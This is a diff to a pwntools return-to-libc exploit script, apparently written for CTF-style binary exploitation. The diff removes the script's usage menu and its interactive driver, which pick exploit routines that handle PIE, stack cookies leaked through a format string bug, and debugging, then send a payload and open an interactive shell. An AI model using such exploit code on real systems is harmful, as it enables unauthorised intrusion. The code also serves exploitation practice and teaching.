@@ -2,26 +2,6 @@ from pwn import *
 from sys import argv
 
 
-def menu():
-	print(f"""ret2libc_with_pie(libc_so, func_index, symbol,base_addr, libc_func, padding)
-ret2libc_without_pie(libc_so, padding)
-{"-"*80}
-no pie:
-	python3 ret2libc.py binary libc6_2.27-3ubuntu1.2_amd64.so 140
-{"-"*80}
-with pie:
-	python3 ret2libc.py binary libc6_2.27-3ubuntu1.2_amd64.so 3 read 15 25 140
-						^-- target     ^					  ^   ^   ^  ^  ^
-									   |----- libc            |   |   |  |  ---- padding
-									   				 -------   |   |  |  
-														|         |   |  |--- libc func leak for libc base calculation
-									   		function index     |   |
-											(not stack index)     |   ----- ELF base leak
-														    	  |
-															      ---symbol for libc base calculation\n""")
-
-
-
 def ret2libc_without_pie(program,libc_so, active_process, padding,cookie_index, stack_cookie=False, debugger=False):
 	if debugger == True:
 		gdb.attach(program)
@@ -134,47 +114,3 @@ def ret2libc_with_pie(libc_so, func_index, symbol,base_addr, libc_func,active_pr
 
 	active_process.sendline(payload)
 	active_process.interactive()
-
-
-try:
-	with process(argv[1]) as proc:
-		binary = context.binary = ELF(argv[1], checksec=True)
-		context.update(arch="amd64")
-
-		stack_cookie = input("stack cookie or no stack cookie (y n) -> ")
-		debugger = input("debugger or no debugger (y n) -> ")
-		pie_or_no_pie = input("pie or no pie (y n) -> ")
-		
-		if pie_or_no_pie == "n":
-			if stack_cookie == "y" and debugger == "n":
-				cookie_stack_index = input("enter stack cookie index on the stack for format string vuln -> ")
-				ret2libc_without_pie(binary, argv[2], padding=argv[3], active_process=proc,cookie_index=cookie_stack_index, debugger=False, stack_cookie=True)
-			elif debugger == "y" and stack_cookie == "n":
-				# def ret2libc_without_pie(program,libc_so, active_process, padding,stack_cookie=False, debugger=False):
-				ret2libc_without_pie(binary, argv[2], padding=argv[3], active_process=proc, debugger=True)
-			elif debugger == "n" and stack_cookie == "n":
-				ret2libc_without_pie(binary, argv[2], padding=argv[3], active_process=proc)
-			elif debugger == "y" and stack_cookie == "y":
-				cookie_stack_index = input("enter stack cookie index on the stack for format string vuln -> ")
-				ret2libc_without_pie(binary, argv[2], padding=argv[3], active_process=proc,cookie_index=cookie_stack_index, debugger=True, stack_cookie=True)
-
-
-		elif pie_or_no_pie == "y":
-			if stack_cookie == "y" and debugger == "n":
-				cookie_stack_index = input("enter stack cookie index on the stack for format string vuln -> ")
-				ret2libc_with_pie(libc_so=argv[2], func_index=argv[3], symbol=argv[4], base_addr=argv[5],
-		      libc_func=argv[6], padding=argv[7], cookie_index=cookie_stack_index, stack_cookie=True)
-			elif debugger == "y" and stack_cookie == "n":
-				ret2libc_with_pie(libc_so=argv[2], func_index=argv[3], symbol=argv[4], base_addr=argv[5],
-		      libc_func=argv[6], padding=argv[7], debugger=True)
-			elif debugger == "n" and stack_cookie == "n":
-				ret2libc_with_pie(libc_so=argv[2], func_index=argv[3], symbol=argv[4], base_addr=argv[5],
-		      libc_func=argv[6], padding=argv[7])
-			elif debugger == "y" and stack_cookie == "y":
-				cookie_stack_index = input("enter stack cookie index on the stack for format string vuln -> ")
-				ret2libc_with_pie(libc_so=argv[2], func_index=argv[3], symbol=argv[4], base_addr=argv[5],
-		      libc_func=argv[6], padding=argv[7], cookie_index=cookie_stack_index, stack_cookie=True, debugger=True)
-
-
-except IndexError:
-	menu()
